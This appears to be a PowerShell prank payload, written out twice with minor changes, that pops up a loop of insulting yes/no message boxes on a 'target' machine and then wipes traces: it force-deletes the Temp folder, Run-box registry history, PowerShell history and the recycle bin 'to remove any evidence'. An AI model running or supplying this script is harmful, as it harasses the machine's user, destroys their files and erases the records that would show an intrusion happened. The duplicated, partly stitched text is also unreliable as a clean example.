
Add-Type -AssemblyName System.Windows.Forms

# The number of times you want it to cycle through your list of questions

$cycles = 3

# List as many questions here as you like, it will cycke through all of them

$msgs = @(
"If you select yes you are dumb"
"Did you honestly select Yes?"
"Thats twice!!! Are you really that dump?"
"Select Yes for Dumb and No for Dumber"
"Is your name DUMBO?"
"Are you are proud of yourself?"
"Does everyone else know how much you suck?"
)

for ($i=1; $i -le $cycles; $i++) {

Foreach ($msg in $msgs) {
[System.Windows.Forms.MessageBox]::Show($msg , "You're-a-Loser.exe" , 4 , 'Question')
}
}

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue<#
.SYNOPSIS
	This script will open a series of pop ups in order to taunt your target. I wrote it initially to target call center scammers

.DESCRIPTION 
	This program is to taunt your target. Below are a series insults you can modify as you like. The program will generate a PopUp 
	for each one of them. 
#>

#------------------------------------------------------------------------------------------------------------------------------------



# The number of times you want it to cycle through your list of questions

$cycles = 3

# List as many questions here as you like, it will cycke through all of them

$msgs = @(
"If you select yes you are dumb"
"Did you honestly select Yes?"
"Thats twice are you realy that dump?"
"Select Yes for Dumb and No for Dumb"
"Is your name DUMBO?"
"Are you are proud of yourself?"
"Does you boss know much much you suck at this job?"
)

for ($i=1; $i -le $cycles; $i++) {

Foreach ($msg in $msgs) {
[System.Windows.Forms.MessageBox]::Show($msg , "You're-a-Loser.exe" , 4 , 'Question')
}
}

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
